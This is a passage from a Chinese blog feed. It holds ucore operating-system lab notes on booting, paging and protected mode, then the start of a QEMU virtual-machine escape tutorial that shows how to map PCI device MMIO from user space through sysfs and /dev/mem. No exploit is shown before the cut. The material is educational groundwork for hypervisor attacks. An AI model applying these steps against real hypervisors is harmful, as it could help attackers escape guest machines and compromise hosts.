class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">readsect(<span class="keyword">void</span> *dst, <span class="keyword">uint32_t</span> secno) &#123;</span><br><span class="line">    <span class="comment">// wait for disk to be ready</span></span><br><span class="line">    waitdisk();</span><br><span class="line"></span><br><span class="line">    outb(<span class="number">0x1F2</span>, <span class="number">1</span>);<span class="comment">//0x1F2:所要读的扇区数                    // count = 1</span></span><br><span class="line">    outb(<span class="number">0x1F3</span>, secno &amp; <span class="number">0xFF</span>); <span class="comment">//LBA参数0-7位</span></span><br><span class="line">    outb(<span class="number">0x1F4</span>, (secno &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);<span class="comment">//LBA参数8-15位</span></span><br><span class="line">    outb(<span class="number">0x1F5</span>, (secno &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>);<span class="comment">//LBA参数16-23位</span></span><br><span class="line">    outb(<span class="number">0x1F6</span>, ((secno &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>) | <span class="number">0xE0</span>);<span class="comment">//0-3:LBA参数24-27位，第4位:0为主盘、1为从盘</span></span><br><span class="line">    outb(<span class="number">0x1F7</span>, <span class="number">0x20</span>);<span class="comment">//状态和命令寄存器。操作时先给命令，再读取，如果不是忙状态就从0x1f0端口读数据              // cmd 0x20 - read sectors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for disk to be ready</span></span><br><span class="line">    waitdisk();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read a sector</span></span><br><span class="line">    insl(<span class="number">0x1F0</span>, dst, SECTSIZE / <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>readsect</code>代码与外设(磁盘)交互，读取数据到相应地址。这里用到的是LBA模式的PIO方式，进行IO操作主要是CPU填相应的IO地址寄存器完成(这里是0x1f0-0x1f7)</p><h2 id="关于内存访问"><a href="#关于内存访问" class="headerlink" title="关于内存访问"></a>关于内存访问</h2><p>需要注意的是逻辑地址、线性地址以及物理地址三个概念。(还有一个经常提到的概念是虚拟地址，但是经查阅资料似乎这个概念的说法众说纷纭，有的说是线性地址的别名，有的说是逻辑地址的别名，这里就当成逻辑地址的别名来处理了)</p><p>在保护模式一节中我们介绍了分段的概念，而这里我们主要讲的是分页的概念。在段页式的管理中，通常OS都会弱化分段的概念，而把分页作为主要的地址转换手段。段式管理只是一个过滤的作用，他将一个虚拟地址直接映射成线性地址，然后通过页表转换变成相应的物理地址。</p><p>在通常的分段中，我们会通过段选择子，在段描述符表(GDT)中索引到段描述符，然后加上段描述符中的段基址。但是弱化之后GDT中所有段基址都为0，所以虚拟地址和线性地址等价。那么从虚拟地址到物理地址的过程就是一个页表转换了。</p><p>下面详细说一下在页基址下，线性地址到物理地址的过程。并结合ucore中代码看一下启用页基址的过程</p><p>首先介绍一下x86下和页表有关的寄存器</p><div class="table-container"><table><thead><tr><th>寄存器</th><th>用途</th></tr></thead><tbody><tr><td>CR0</td><td>主要是有关分段与分页的启动(不止分页，一些其他控制flag也会涉及到CR0寄存器)</td></tr><tr><td>CR2</td><td>保存发生缺页故障时的虚拟地址</td></tr><tr><td>CR3</td><td>保存当前进程的页目录表的<strong>物理内存</strong>基地址</td></tr><tr><td>CR4</td><td>PRE是否开启物理地址扩展</td></tr></tbody></table></div><p>这里比较重要的就是CR3寄存器，需要注意的是它保存的是当前进程的页目录表的<strong>物理内存</strong>基地址（设想一下如果它保存的是页目录表的虚拟内存基地址，那么我们进行地址转换的时候需要索引页目录表，但是要找到页目录表虚拟地址对应的物理地址在哪，就又得去索引页目录表….死循环了)</p><p>在x86下，我们用到的是两级页表(一个页目录表，一个页表)，具体转化的过程如下(用了知乎上面的一张图，侵删)</p><p><img src="https://s2.loli.net/2023/10/15/AdNhl9PmsvHgG3D.png" alt="image-20230430175825867"></p><p>首先根据高位的<code>DIRECTORY</code>部分，通过CR3寄存器存放的页目录表索引到页表基址(这个也是物理地址，与CR3原因同理)，然后再根据这个页表基址结合我们的中间的<code>TABLE</code>部分，找到页表项，与页偏移相结合得到了正确的物理地址。多级页表同理</p><p>我们从ucore的实现中看一下页表基址的启动过程，主要的实现是在<code>kern/init/entry.S</code>中,在上一节<code>关于启动</code>中，当我们把内核读进去的时候就会通过<code>((void (*)(void))(ELFHDR-&gt;e_entry &amp; 0xFFFFFF))();</code>跳转到这里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;mmu.h&gt;</span><br><span class="line">#include &lt;memlayout.h&gt;</span><br><span class="line"></span><br><span class="line">#define REALLOC(x) (x - KERNBASE)</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.globl kern_entry</span><br><span class="line">kern_entry:</span><br><span class="line">    # load pa of boot pgdir</span><br><span class="line">    movl $REALLOC(__boot_pgdir), %eax</span><br><span class="line">    movl %eax, %cr3</span><br><span class="line"></span><br><span class="line">    # enable paging</span><br><span class="line">    movl %cr0, %eax</span><br><span class="line">    orl $(CR0_PE | CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_TS | CR0_EM | CR0_MP), %eax</span><br><span class="line">    andl $~(CR0_TS | CR0_EM), %eax</span><br><span class="line">    movl %eax, %cr0</span><br><span class="line"></span><br><span class="line">    # update eip</span><br><span class="line">    # now, eip &#x3D; 0x1.....</span><br><span class="line">    leal next, %eax</span><br><span class="line">    # set eip &#x3D; KERNBASE + 0x1.....</span><br><span class="line">    jmp *%eax</span><br><span class="line">next:</span><br><span class="line"></span><br><span class="line">    # unmap va 0 ~ 4M, it&#39;s temporary mapping</span><br><span class="line">    xorl %eax, %eax</span><br><span class="line">    movl %eax, __boot_pgdir</span><br><span class="line"></span><br><span class="line">    # set ebp, esp</span><br><span class="line">    movl $0x0, %ebp</span><br><span class="line">    # the kernel stack region is from bootstack -- bootstacktop,</span><br><span class="line">    # the kernel stack size is KSTACKSIZE (8KB)defined in memlayout.h</span><br><span class="line">    movl $bootstacktop, %esp</span><br><span class="line">    # now kernel stack is ready , call the first C function</span><br><span class="line">    call kern_init</span><br><span class="line"></span><br><span class="line"># should never get here</span><br><span class="line">spin:</span><br><span class="line">    jmp spin</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">.align PGSIZE</span><br><span class="line">    .globl bootstack</span><br><span class="line">bootstack:</span><br><span class="line">    .space KSTACKSIZE</span><br><span class="line">    .globl bootstacktop</span><br><span class="line">bootstacktop:</span><br><span class="line"></span><br><span class="line"># kernel builtin pgdir</span><br><span class="line"># an initial page directory (Page Directory Table, PDT)</span><br><span class="line"># These page directory table and page table can be reused!</span><br><span class="line">.section .data.pgdir</span><br><span class="line">.align PGSIZE</span><br><span class="line">__boot_pgdir:</span><br><span class="line">.globl __boot_pgdir</span><br><span class="line">    # map va 0 ~ 4M to pa 0 ~ 4M (temporary)</span><br><span class="line">    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)</span><br><span class="line">    .space (KERNBASE &gt;&gt; PGSHIFT &gt;&gt; 10 &lt;&lt; 2) - (. - __boot_pgdir) # pad to PDE of KERNBASE</span><br><span class="line">    # map va KERNBASE + (0 ~ 4M) to pa 0 ~ 4M</span><br><span class="line">    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)</span><br><span class="line">    .space PGSIZE - (. - __boot_pgdir) # pad to PGSIZE</span><br><span class="line"></span><br><span class="line">.set i, 0</span><br><span class="line">__boot_pt1:</span><br><span class="line">.rept 1024</span><br><span class="line">    .long i * PGSIZE + (PTE_P | PTE_W)</span><br><span class="line">    .set i, i + 1</span><br><span class="line">.endr</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="关于中断与异常"><a href="#关于中断与异常" class="headerlink" title="关于中断与异常"></a>关于中断与异常</h2><p>类似段描述符，我们有中断描述符于中断描述符表(IDT),CPU通过IDT寄存器IDTR来获取中断描述符表的基址</p><h2 id="关于特权级"><a href="#关于特权级" class="headerlink" title="关于特权级"></a>关于特权级</h2><h1 id="LAB"><a href="#LAB" class="headerlink" title="LAB"></a>LAB</h1><h2 id="LAB1"><a href="#LAB1" class="headerlink" title="LAB1"></a>LAB1</h2><h3 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h3><blockquote><p>理解通过make生成执行文件的过程</p></blockquote><p>通过<code>make V=</code>可以观察出总的过程</p><p>这里顺便整理一下makefile的编写原理</p><h3 id="练习2"><a href="#练习2" class="headerlink" title="练习2"></a>练习2</h3><blockquote><p> 使用qemu执行并调试lab1中的软件</p></blockquote><p>按理说是执行<code>make debug</code>就可以，但是我没起起来，似乎是因为在执行<code>make debug</code>的时候另起一个终端来执行我们的gdb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TERMINAL        :=gnome-terminal</span><br><span class="line">$(V)$(TERMINAL) -e <span class="string">&quot;gdb -q -tui -x tools/gdbinit&quot;</span></span><br></pre></td></tr></table></figure><p>而这个<code>gnome-terminal</code>我本地执行有点问题</p><p>所以我就直接不带debug地<code>make</code>,然后在命令行下直接执行qemu</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -S -s -parallel stdio -hda bin/ucore.img -serial null</span><br></pre></td></tr></table></figure><p>然后再起个终端执行gdb，类似调试内核那样直接运行<code>target remote:1234</code></p><p>然后就可以gdb调试了</p><p>需要注意的是，在调试BIOS的指令时我们必须手动地加上段寄存器的值才能看到真正执行的代码，就像下面一样。这是因为cs寄存器初始化非零，但是gdb默认只输出ip指向地址的代码。</p><p><img src="https://s2.loli.net/2023/10/15/hVBb2RTpIXWiEN4.png" alt="image-20230428145341002"></p><h3 id="练习3"><a href="#练习3" class="headerlink" title="练习3"></a>练习3</h3><blockquote><p>分析bootloader进入保护模式的过程</p></blockquote><p>bootloader进入保护模式的代码在bootasm.S中有</p><p>在开启保护模式之前我们还需要开启A20</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    # Enable A20:</span><br><span class="line">    #  For backwards compatibility with the earliest PCs, physical</span><br><span class="line">    #  address line 20 is tied low, so that addresses higher than</span><br><span class="line">    #  1MB wrap around to zero by default. This code undoes this.</span><br><span class="line">seta20.1:</span><br><span class="line">    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).</span><br><span class="line">    testb $0x2, %al</span><br><span class="line">    jnz seta20.1</span><br><span class="line"></span><br><span class="line">    movb $0xd1, %al                                 # 0xd1 -&gt; port 0x64</span><br><span class="line">    outb %al, $0x64                                 # 0xd1 means: write data to 8042&#39;s P2 port</span><br><span class="line"></span><br><span class="line">seta20.2:</span><br><span class="line">    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).</span><br><span class="line">    testb $0x2, %al</span><br><span class="line">    jnz seta20.2</span><br><span class="line"></span><br><span class="line">    movb $0xdf, %al                                 # 0xdf -&gt; port 0x60</span><br><span class="line">    outb %al, $0x60                                 # 0xdf &#x3D; 11011111, means set P2&#39;s A20 bit(the 1 bit) to 1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>阅读注释我们可以知道要开启A20的原因:为了和早期的PC适配</p><p>在<code>实模式及其工作原理</code>中我们说到8086 CPU提供了20根地址线，但是寄存器16位，于是乎采取了段+基址的形式，也就是段寄存器&lt;&lt;4+段内偏移的方式来访问内存，但是这样的话能访问的地址最大值是(16&lt;&lt;4)+16 位也就是1088kb，超过了20根地址线能表示的范围，于是会发生回卷。但是后面的CPU没有这种情况，为了兼容于是设置了A20</p><p>这段汇编不难理解就是去访问0x64端口的状态寄存器，空闲之后就把0xd1置到0x64端口上，意味着我们要对8042的P2端口写数据，然后就同样等空闲写0xdf到0x60端口，设置P2的A20比特位为1</p><p>然后就是开启了保护模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># Switch from real to protected mode, using a bootstrap GDT</span><br><span class="line"># and segment translation that makes virtual addresses</span><br><span class="line"># identical to physical addresses, so that the</span><br><span class="line"># effective memory map does not change during the switch.</span><br><span class="line">lgdt gdtdesc</span><br><span class="line">movl %cr0, %eax</span><br><span class="line">orl $CR0_PE_ON, %eax</span><br><span class="line">movl %eax, %cr0</span><br><span class="line"></span><br><span class="line"># Jump to next instruction, but in 32-bit code segment.</span><br><span class="line"># Switches processor into 32-bit mode.</span><br><span class="line">ljmp $PROT_MODE_CSEG, $protcseg</span><br></pre></td></tr></table></figure><p><code>lgdt gdtdesc</code>将GDT入口地址存到GDTR寄存器里</p><p>我们用gdb是无法查看诸如GDTR或者CR0这样的寄存器的，为了方便查看这样的寄存器，我们可以在qemu启动命令参数上面加上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-monitor telnet:127.0.0.1:33333,server,nowait</span><br></pre></td></tr></table></figure><p>然后另开一个中断，nc或者telnet连接上去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 127.0.0.1 33333</span><br></pre></td></tr></table></figure><p>使用<code>info registers</code>就能查看到这些寄存器了</p><p><img src="https://s2.loli.net/2023/10/15/T8pdH34RGJaFUNg.png" alt="image-20231015194918785"></p><p>这里在<code>lgdt gdtdesc</code>这里下了断点，可以看到GDTR被设置成了0x17以及gdt的地址，也就是gdtdesc所声明的这一块</p><p><img src="https://s2.loli.net/2023/10/15/tnzEmHOJa5ZRkCM.png" alt="image-20231015195104443"></p><p>我们继续对开启保护模式的那段汇编代码进行分析，可以知道就是读取cr0寄存器，然后或上CR0_PE_ON也就是CR0中掌管保护模式的那一个位，然后再赋给cr0就可以了</p><p>这里看一下我们所设定的gdt表项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdt:</span><br><span class="line">    SEG_NULLASM                                     # null seg</span><br><span class="line">    SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff)           # code seg for bootloader and kernel</span><br><span class="line">    SEG_ASM(STA_W, 0x0, 0xffffffff)                 # data seg for bootloader and kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分别设置了空表项，代码段表项以及数据段表项</p><p>因为是第一次，这里详细介绍一些从段寄存器到寻址的一个过程</p><p>通过<code>ljmp $PROT_MODE_CSEG, $protcseg</code>这一条指令，我们设定了CS段寄存器为段选择子PROT_MODE_CSEG=8，</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\ucore-lab.assets\image-20231015202940367.png" alt="image-20231015202940367"></p><p>然后我们知道段选择子的3-15位是索引，而8对应二进制为0x1000，其3-15位为1，所以我们通过GDTR获取出GDT基址，与索引进行组合便可以得出就是我们GDT表的第1项，对应声明的<code>SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff)</code>这一项</p><p>这里顺便分析一下SEG_ASM这一个宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEG_ASM(type,base,lim)                                  \</span></span><br><span class="line">    .word (((lim) &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xffff</span>), ((base) &amp; <span class="number">0xffff</span>);          \</span><br><span class="line">    .byte (((base) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>), (<span class="number">0x90</span> | (type)),             \</span><br><span class="line">        (<span class="number">0xC0</span> | (((lim) &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xf</span>)), (((base) &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>)</span><br></pre></td></tr></table></figure><p>可以知道其是64位的，结构与我们上述段描述符那个图是一一对应的</p><h3 id="练习4"><a href="#练习4" class="headerlink" title="练习4"></a>练习4</h3><blockquote><p>分析bootloader加载ELF格式的OS的过程</p></blockquote><p>代码在bootmain.c里面，在<code>关于启动-&gt;MBR</code>那里我们已经分析过了</p><h3 id="练习5"><a href="#练习5" class="headerlink" title="练习5"></a>练习5</h3><blockquote><p>实现函数调用堆栈跟踪函数</p></blockquote><p>就根据32位下函数调用栈的结构，不断回溯并输出参数以及地址即可。熟悉32位下简单栈溢出的话应该很容易做</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">print_stackframe(<span class="keyword">void</span>) &#123;</span><br><span class="line">     <span class="comment">/* LAB1 YOUR CODE : STEP 1 */</span></span><br><span class="line">     <span class="comment">/* (1) call read_ebp() to get the value of ebp. the type is (uint32_t);</span></span><br><span class="line"><span class="comment">      * (2) call read_eip() to get the value of eip. the type is (uint32_t);</span></span><br><span class="line"><span class="comment">      * (3) from 0 .. STACKFRAME_DEPTH</span></span><br><span class="line"><span class="comment">      *    (3.1) printf value of ebp, eip</span></span><br><span class="line"><span class="comment">      *    (3.2) (uint32_t)calling arguments [0..4] = the contents in address (uint32_t)ebp +2 [0..4]</span></span><br><span class="line"><span class="comment">      *    (3.3) cprintf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">      *    (3.4) call print_debuginfo(eip-1) to print the C calling function name and line number, etc.</span></span><br><span class="line"><span class="comment">      *    (3.5) popup a calling stackframe</span></span><br><span class="line"><span class="comment">      *           NOTICE: the calling funciton&#x27;s return addr eip  = ss:[ebp+4]</span></span><br><span class="line"><span class="comment">      *                   the calling funciton&#x27;s ebp = ss:[ebp]</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ebp = read_ebp();</span><br><span class="line">    <span class="keyword">uint32_t</span> eip = read_eip();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;STACKFRAME_DEPTH&amp;&amp;ebp !=<span class="number">0</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cprintf(<span class="string">&quot;ebp = 0x%08x,eip = 0x%08x\n&quot;</span>,ebp,eip);</span><br><span class="line">        <span class="keyword">uint32_t</span>* args = (<span class="keyword">uint32_t</span>*)ebp + <span class="number">2</span>;</span><br><span class="line">        cprintf(<span class="string">&quot;args:&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cprintf(<span class="string">&quot;0x%08x &quot;</span>,args[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        cprintf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        print_debuginfo(eip<span class="number">-1</span>);</span><br><span class="line">        eip = *((<span class="keyword">uint32_t</span>*)ebp+<span class="number">1</span>);</span><br><span class="line">        ebp = *(<span class="keyword">uint32_t</span>*)ebp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="练习6"><a href="#练习6" class="headerlink" title="练习6"></a>练习6</h3><blockquote><p>完善中断初始化和处理</p></blockquote><h2 id="LAB2"><a href="#LAB2" class="headerlink" title="LAB2"></a>LAB2</h2><h1 id="一些调试tips"><a href="#一些调试tips" class="headerlink" title="一些调试tips"></a>一些调试tips</h1><p>查看CR0、GDTR等寄存器的方法</p><h1 id="REFERENCE"><a href="#REFERENCE" class="headerlink" title="REFERENCE"></a>REFERENCE</h1><p><a href="https://zhuanlan.zhihu.com/p/42309472">CPU的实模式和保护模式(一) - 知乎 (zhihu.com)</a></p><p><a href="https://www.cnblogs.com/wingsummer/p/15312627.html">保护模式篇——段描述符与段选择子 - 寂静的羽夏 - 博客园 (cnblogs.com)</a></p><p><a href="https://juejin.cn/post/6844904110857125895">计算机系统是如何启动的？ - 掘金 (juejin.cn)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;感觉自己开发经验很少，多以写脚本为主，没怎么接触过较为大型的项目，所以想搞点开发相关的经验。打算借ucore再回顾一下OS相关的知识。这个项目啃完之后打算看看南大的那个模拟的lab，然后学点C++逆向。&lt;/p&gt;
&lt;p&gt;BASIC-KNOWLEDGE记得比较杂(因为感觉知识点</summary>
      
    
    
    
    
    <category term="kernel" scheme="http://phot0n.com/tags/kernel/"/>
    
    <category term="dev" scheme="http://phot0n.com/tags/dev/"/>
    
  </entry>
  
  <entry>
    <title>QEMU逃逸入门</title>
    <link href="http://phot0n.com/2023/04/08/QEMU-RUN/"/>
    <id>http://phot0n.com/2023/04/08/QEMU-RUN/</id>
    <published>2023-04-07T16:09:19.000Z</published>
    <updated>2023-08-08T16:55:53.694Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>好，我润！</p></blockquote><h1 id="PCI设备简介"><a href="#PCI设备简介" class="headerlink" title="PCI设备简介"></a>PCI设备简介</h1><p>什么是PCI设备，关于PCI设备，小编也很好奇….</p><p>不扯皮了,PCI设备简而言之就是插在PCI插槽上面的一些设备,包括比如声卡 网卡之类的.它们都遵循PCI总线标准</p><p>既然有了设备,我们首先想到的肯定是如何与其交互的问题</p><p>我们在操作系统课(还是计组来着,我忘了)上学过,CPU与外设进行交互通常分为两种类型:</p><ul><li>MMIO:也就是内存映射IO,外设和内存共享地址空间,我们可以像读写内存一样读写外设内容</li><li>PMIO:也就是端口映射IO,外设和内存的地址空间相独立,CPU需要用一些专门的指令与外设进行交互(比如INTEL的CPU使用IN和OUT指令)</li></ul><p>我们先有这么一个概念,后面及题目中会有详细介绍如何交互的过程</p><p>不过大概许多人和我一样都有一些疑问:PCI设备是如何被CPU发现的,操作系统如何管理这些PCI设备,我们如何查看电脑上插了哪些设备….这些问题后面也许会提到一些吧(x</p><h2 id="PCI设备配置空间"><a href="#PCI设备配置空间" class="headerlink" title="PCI设备配置空间"></a>PCI设备配置空间</h2><p>每个PCI设备都有一个配置空间,介绍了关于这个设备的一些信息,其大小为256字节,头部64字节是PCI标准规定的,</p><p>一般我们关注Device ID和Vendor ID就行了</p><p><img src="https://s2.loli.net/2023/05/09/l4UyqSbeOP7IWvj.png" alt="image-20230509215655296"></p><p>还有一个比较重要的是<code>Base Address Registers(BAR)</code>这块,它记录了设备用到的地址空间类型\基址以及其他属性</p><p><img src="https://s2.loli.net/2023/05/09/oQMx4KiRjcbWNug.png" alt="image-20230509220506733"></p><p>BAR的最后一位标识了地址空间类型,也就是前面简要提到的MMIO以及PMIO(为0时为MMIO)</p><p>而其他字段根据图也可以很清楚的看到,比较重要的就是高位的基址(Base Address)</p><h2 id="查看PCI设备"><a href="#查看PCI设备" class="headerlink" title="查看PCI设备"></a>查看PCI设备</h2><p>我们可以通过<code>lspci</code>这个命令来查看当前主机的PCI总线信息</p><p><img src="https://s2.loli.net/2023/05/09/SAxoLEywfGiIRz3.png" alt="image-20230509221439032"></p><p>前面的标识<code>XX:YY:ZZ</code>代表着<code>总线:设备:功能</code> .也就是说,每个PCI设备有一个总线号,一个设备号,一个功能号来标识,通过这个我们有时候可以在<code>/sys/devices</code>下找到对应的设备的一些配置信息</p><p><img src="https://s2.loli.net/2023/05/09/DEnvO5i2obTeSWI.png" alt="image-20230509221609717"></p><p>比如这里我们可以查看到某个设备的配置空间,包括前文提到的设备号,厂商号,BAR等</p><p><img src="https://s2.loli.net/2023/05/09/fK5baoFPXi4sMYJ.png" alt="image-20230509221813086"></p><p>查看目录下的<code>resource</code>文件可以查看到相应内存空间</p><p><img src="https://s2.loli.net/2023/05/09/YVuLe6wxbprS21v.png" alt="image-20230509222152675"></p><p>每行代表着相应空间的起始地址,结束地址以及标识位.拿图中举例子,其第一行代表着一个起始地址为<code>0x00000000fea00000</code>,结束地址为<code>0x00000000feafffff</code>,标识位为<code>0x0000000000040200</code>的空间</p><h2 id="与PCI设备交互-访问对应空间"><a href="#与PCI设备交互-访问对应空间" class="headerlink" title="与PCI设备交互,访问对应空间"></a>与PCI设备交互,访问对应空间</h2><p>我们可以在内核态与用户态都能访问对应空间。这里主要说一下MMIO的访问。</p><p>大部分情况下我们在用户态访问就行了,有两种方式，一种就是通过映射<code>resource0</code>文件，还有一种是通过<code>open(&quot;/dev/mem&quot;,2)</code></p><p>前者是这样操作的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>    mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line"><span class="keyword">void</span> * mmio    = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>而后者是这样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * mmio    = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED, open(<span class="string">&quot;/dev/mem&quot;</span>,<span class="number">2</span>),<span class="number">0xfea00000</span>);</span><br></pre></td></tr></table></figure><p>后面那个地址<code>0xfea00000</code>就是我们之前通过<code>cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</code>所能发现的地址首址</p><p>然后我们就可以对对应地址进行读写操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>合在一起加上头文件就是</p><figure class="highlight 